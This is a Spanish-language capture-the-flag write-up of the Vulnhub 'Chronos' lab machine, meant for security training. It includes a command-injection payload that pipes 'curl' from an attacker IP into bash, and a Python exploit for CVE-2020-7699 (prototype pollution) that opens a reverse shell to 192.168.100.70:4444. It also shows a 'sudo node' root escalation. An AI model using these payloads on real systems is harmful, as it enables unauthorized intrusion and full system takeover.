---
title: Vulnhub - Chronos
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Medium]
tags: [Linux, 'Inyección de Comandos', 'RCE (CVE-2020-7699)']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Medium/Chronos/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Chronos Machine Logo
---

Máquina Linux de nivel **Medium** de Vulnhub.

Técnicas usadas: **NodeJS, RCE (CVE-2020-7699)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Medium/Chronos/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Medium/Chronos/02-versions.png)

c. Si analizamos el código fuente de la página del puerto **8000**, veremos que se tramita cierta información

```js
var _0x5bdf='http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL'
```

> Añadiremos el host **chronos.local** al fichero `/etc/hosts` y la información la decodearemos con [**CyberChef**](https://gchq.github.io/CyberChef/)
{: .prompt-info }

* La información viaja encodeada en **base58**

    ![](/assets/images/Vulnhub/Medium/Chronos/03-cyberchef.png)

* Lo que trataremos de realizar será una **Inyección de Comandos**, para saber si la página es vulnerable ejecutaremos un ping hacia nuestra máquina, en la cual, esteraremos previamente en escucha con **tcpdump**

    ![](/assets/images/Vulnhub/Medium/Chronos/04-rce.png)

* El payload anterior lo enviaremos a través de **Burp Suite**

    ![](/assets/images/Vulnhub/Medium/Chronos/05-steps.png)

d. Nos entablamos un reverse shell

* Encodeamos el siguiente payload: "`curl http://<IP Atacante>|bash`'+Today is %A, %B %d, %Y %H:%M:%S.'"

    ![](/assets/images/Vulnhub/Medium/Chronos/06-reverse.png)

### Escalada de Privilegios 💹

a. Si inspeccionamos la máquina nos encontramos con una versión2 del sitio web de chronos

```bash
www-data@chronos:/opt$ ls
chronos  chronos-v2
```

* Si vemos el código llegamos a un versión de una biblioteca usada

    ```bash
    www-data@chronos:/opt/chronos-v2/backend$ cat package.json 
    
    <SNIP>
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
    ```

    * Datos a tener en cuenta
        + [x] El sitio web no es accesible desde nuestra máquina de atacante.
        + [x] Se ejecuta por el puerto 8080
        + [x] La versión de la biblioteca usada es vulnerable a [CVE-2020-7699](https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325)

b. Transferimos el script de python para llegar a ejecutar comandos y con esto nos enviaremos una reverse shell

```bash
www-data@chronos:/tmp$ cat rce.py 
import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i >& /dev/tcp/192.168.100.70/4444 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://127.0.0.1:8080')
print("Finished!")
```

* Lo ejecutamos y nos ponemos en escucha previamente con nc

    ![](/assets/images/Vulnhub/Medium/Chronos/07-shell.png)


c. Inspeccionamos nuestros privilegios a nivel de sudoers

```bash
imera@chronos:/opt/chronos-v2/backend$ sudo -l

User imera may run the following commands on chronos:
    (ALL) NOPASSWD: /usr/local/bin/npm *
    (ALL) NOPASSWD: /usr/local/bin/node *
```

* Vemos en [**GTFOBins**](https://gtfobins.github.io/gtfobins/node/#sudo) una forma de escalar privilegios usando **node**

    ```bash
    imera@chronos:/opt/chronos-v2/backend$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
    whoami
    root
    ```